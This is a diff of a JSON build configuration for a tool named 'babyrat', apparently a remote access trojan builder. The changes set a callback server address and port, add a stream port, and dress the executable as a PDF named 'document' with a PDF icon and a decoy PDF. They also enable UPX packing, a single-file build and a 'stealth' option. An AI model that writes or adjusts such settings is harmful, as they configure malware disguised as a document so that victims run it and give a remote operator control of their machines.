@@ -1,14 +1,15 @@
 {
-  "server_ip": "54.174.116.107",
+  "server_ip": "10.71.155.228",
   "server_port": "80",
-  "output_name": "english",
+  "stream_port": "",
+  "output_name": "document",
   "console": false,
   "uac_admin": false,
   "icon": "C:\\Users\\bense\\Desktop\\babyrat\\babyrat-main\\pdflogo.ico",
   "upx": true,
   "onefile": true,
   "use_pdf": true,
-  "pdf_path": "C:\\Users\\bense\\Documents\\English Proficiency Certificate revised.pdf",
+  "pdf_path": "decoy.pdf",
   "stealth": true,
   "icon_path": "C:\\Users\\bense\\Desktop\\babyrat\\babyrat-main\\logo.ico"
 }
